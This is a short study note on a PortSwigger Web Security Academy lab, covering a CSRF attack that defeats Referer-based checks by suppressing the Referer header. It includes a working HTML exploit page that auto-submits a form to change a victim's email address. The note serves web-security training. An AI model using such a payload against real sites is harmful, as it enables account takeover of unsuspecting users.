---
tags:
  - PRACTITIONER
Link:
  - "[[CSRF]]"
External Link:
  - https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present
---

# CSRF where Referer validation depends on header being present
---

- **Info:**
	- Vulnerable parameter - email change functionality
	- Goal - exploit the CSRF vulnerability to change the email address of the victim user
	- creds - `wiener:peter`

-  **Analysis:**
	- In order for CSRF attack to be possible:
		- A relevant action - ***email change functionality***
		- Cookie-based session handling - ***session cookie***
		- No unpredictable request parameters - satisfied

- **Bypass referer header:**
	1. Remove referer header - satisfied

- Craft Exploit that removes the referrer header of a request
```html
<html>
	<head>
		<meta name="referrer" content="no-referrer">
	</head>
	<body>
		<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="pwned@normal-user.net">
		</form>
	<script>
		document.forms[0].submit();
	</script>
	</body>
</html>
	```



